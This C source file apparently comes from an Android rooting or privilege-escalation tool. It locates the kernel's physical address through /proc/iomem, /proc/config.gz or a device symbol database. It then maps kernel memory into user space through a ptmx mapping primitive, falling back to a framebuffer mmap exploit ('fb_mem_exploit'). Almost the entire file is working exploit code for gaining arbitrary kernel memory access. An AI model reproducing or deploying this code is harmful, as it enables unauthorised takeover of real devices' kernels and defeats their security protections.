#include <stdio.h>
#include <sys/mman.h>
#include <zlib.h>

#include "device_database/device_database.h"
#include "libfb_mem_exploit/fb_mem.h"
#include "ptmx.h"
#include "kernel_memory.h"

#define PTMX_MEMORY_MAPPED_ADDRESS      0x20000000

#define CONFIG_SEARCH_STRING   "CONFIG_PHYS_OFFSET="
#define CONFIG_SEARCH_LENGTH   (sizeof(CONFIG_SEARCH_STRING) - 1)

static unsigned long int kernel_mapped_address;

void *
convert_to_kernel_virtual_address(void *address)
{
  return address - kernel_mapped_address + KERNEL_BASE_ADDRESS;
}

void *
convert_to_kernel_mapped_address(void *address)
{
  return address - KERNEL_BASE_ADDRESS + kernel_mapped_address;
}

static unsigned long int
find_kernel_text_from_config(void)
{
  unsigned long int kernel_ram = 0;
  gzFile f;

  f = gzopen("/proc/config.gz", "rb");
  if (!f) {
    return 0;
  }

  while (!gzeof(f)) {
    char buffer[1024];
    int len;

    if (gzgets(f, buffer, sizeof (buffer) - 1) == Z_NULL) {
      break;
    }

    buffer[sizeof(buffer) - 1] = '\0';

    if (strncmp(buffer, CONFIG_SEARCH_STRING, CONFIG_SEARCH_LENGTH) == 0) {
      char *p;

      strtok(buffer + CONFIG_SEARCH_LENGTH, "\r\n");

      kernel_ram = strtoul(buffer + CONFIG_SEARCH_LENGTH, &p, 0);
      if (!*p) {
	kernel_ram += 0x00008000;

	printf("Detected kernel physical address at 0x%08x form config\n", kernel_ram);

	gzclose(f);

	return kernel_ram;
      }

      kernel_ram = 0;
      break;
    }
  }

  gzclose(f);

  return kernel_ram;
}

static unsigned long int
find_kernel_text_from_iomem(void)
{
  unsigned long int kernel_ram;
  FILE *fp;

  fp = fopen("/proc/iomem", "rt");
  if (!fp) {
    return 0;
  }

  kernel_ram = 0;

  while (!feof(fp)) {
    unsigned long int start, end;
    char buf[256];
    char *p;
    int len;
    char colon[256], name1[256], name2[256];
    int n;

    p = fgets(buf, sizeof (buf) - 1, fp);
    if (p == NULL)
      break;

    if (sscanf(buf, "%lx-%lx %s %s %s", &start, &end, colon, name1, name2) != 5
        || strcmp(colon, ":")) {
      continue;
    }

    if (!strcasecmp(name1, "System") && !strcasecmp(name2, "RAM")) {
      kernel_ram = start;
      continue;
    }

    if (strcasecmp(name1, "Kernel") || (strcasecmp(name2, "text") && strcasecmp(name2, "code"))) {
      kernel_ram = 0;
      continue;
    }

    fclose(fp);

    kernel_ram += 0x00008000;

    printf("Detected kernel physical address at 0x%08x form iomem\n", kernel_ram);

    return kernel_ram;
  }

  fclose(fp);
  return 0;
}

unsigned long int kernel_physical_offset;

static bool
setup_variables(void)
{
  kernel_physical_offset = device_get_symbol_address(DEVICE_SYMBOL(kernel_physical_offset));
  if (kernel_physical_offset) {
    return true;
  }

  kernel_physical_offset = find_kernel_text_from_iomem();
  if (!kernel_physical_offset) {
    kernel_physical_offset = find_kernel_text_from_config();
  }

  if (kernel_physical_offset) {
#ifdef HAS_SET_SYMBOL_ADDRESS
    device_set_symbol_address(DEVICE_SYMBOL(kernel_physical_offset), kernel_physical_offset);
#endif /* HAS_SET_SYMBOL_ADDRESS */
    return true;
  }

  print_reason_device_not_supported();
  return false;
}

static int fb_mmap_fd = -1;
static void *fb_mem_mmap_base;

bool
map_kernel_memory(void)
{
  if (!kernel_physical_offset) {
    if (!setup_variables()) {
      return false;
    }
  }

  fb_mmap_fd = -1;

  kernel_mapped_address = PTMX_MEMORY_MAPPED_ADDRESS;
  if (ptmx_map_memory(PTMX_MEMORY_MAPPED_ADDRESS, kernel_physical_offset, KERNEL_MEMORY_SIZE)) {
    return true;
  }

  fb_mem_set_kernel_phys_offset(kernel_physical_offset - 0x8000);

  printf("Attempt fb_mem_exploit...\n");
  fb_mem_mmap_base = fb_mem_mmap(&fb_mmap_fd);
  if (fb_mem_mmap_base == MAP_FAILED) {
    fb_mem_mmap_base = NULL;
  }

  if (fb_mem_mmap_base) {
    kernel_mapped_address = (unsigned long int)fb_mem_convert_to_mmaped_address((void *)KERNEL_BASE_ADDRESS, fb_mem_mmap_base);
    return true;
  }

  fb_mmap_fd = -1;

  return false;
}

bool
unmap_kernel_memory(void)
{
  if (!kernel_physical_offset) {
    return false;
  }

  if (fb_mmap_fd >= 0) {
    int ret = fb_mem_munmap(fb_mem_mmap_base, fb_mmap_fd);
    fb_mmap_fd = -1;
    return (ret == 0);
  }

  return ptmx_unmap_memory(PTMX_MEMORY_MAPPED_ADDRESS, KERNEL_MEMORY_SIZE);
}
